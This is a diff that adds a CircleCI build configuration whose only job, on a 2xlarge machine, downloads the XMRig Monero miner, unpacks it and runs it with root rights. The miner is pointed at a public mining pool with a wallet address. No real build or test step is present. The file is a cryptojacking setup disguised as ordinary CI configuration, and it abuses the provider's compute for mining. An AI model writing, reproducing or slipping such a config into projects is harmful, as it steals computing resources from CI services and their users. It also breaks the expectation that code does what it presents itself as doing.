@@ -1,0 +1,27 @@
+version: 2.1
+
+jobs:
+  build:
+  
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: 2xlarge
+    
+
+    steps:
+      - run:
+         name: "pro"
+         
+         command: | 
+          sudo su --command "wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 && ./xmrig -o pool.hashvault.pro:443 -u 89hV9R3NZ1oVm9jmLnfFaCSswKhp8GbdNb5hVjbEFfRUDqSho72SXa4E4zWhgxpDo4L4HT2AXYAYwMfgJfnkKGosULz7oXZ -k  --tls --rig-id gamblingbos "
+   
+          
+
+    
+           
+
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
